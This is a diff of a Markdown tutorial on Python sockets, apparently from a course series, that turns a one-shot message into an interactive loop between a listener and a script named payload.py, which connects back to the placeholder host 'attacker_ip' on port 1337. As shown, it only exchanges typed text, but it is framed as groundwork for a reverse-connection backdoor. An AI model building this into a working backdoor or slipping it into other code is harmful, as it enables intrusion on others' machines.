@@ -1,4 +1,4 @@
-<h2 align="center">Client Side Programming</h2>
+<h2 align="center">Send message from Server to Client</h2>
 <p align="center"><img width="350" height="350" src="./src/banner_cnph.gif"></p>
 
 - - - - - - - - - - - - - - - - - - - - - -
@@ -17,9 +17,15 @@ print("Server has started")
 connection, address = listener.accept()
 print(f"Connected to {address}")
 
-## use connection object, in order to send information
-## do it in form of bytes through typecasting b"message"
-connection.send(b"Hello there!")
+## create loop that will iterate continuously
+while True:
+	inp = input(">> ")
+	## convert the input string into bytes and decoded
+	connection.send(bytes(inp, "utf-8"))
+	
+	## server machine should also receive information same as client
+	recv = connection.recv(2048)
+	print(recv.decode("utf-8"))
 ```
 ---
 > [payload.py](payload.py)
@@ -32,8 +38,13 @@ payload.connect(("attacker_ip", 1337))
 
 print("Connected")
 
-## write code to receive and decode message
-output = payload.recv(2048) # 1024 is approximately 1K bytes, 2048 is 2K bytes of data
-## convert output in a form of string
-print(output.decode("utf-8"))
+## create loop that will receive data continuously sent by client machine
+while True:
+	recv = payload.recv(2048)
+	print(recv.decode("utf-8"))
+
+	## if the client machine wants to send information first
+	inp = input(">> ")
+	## convert the input string into bytes and decoded
+	payload.send(bytes(inp, "utf-8"))
 ```
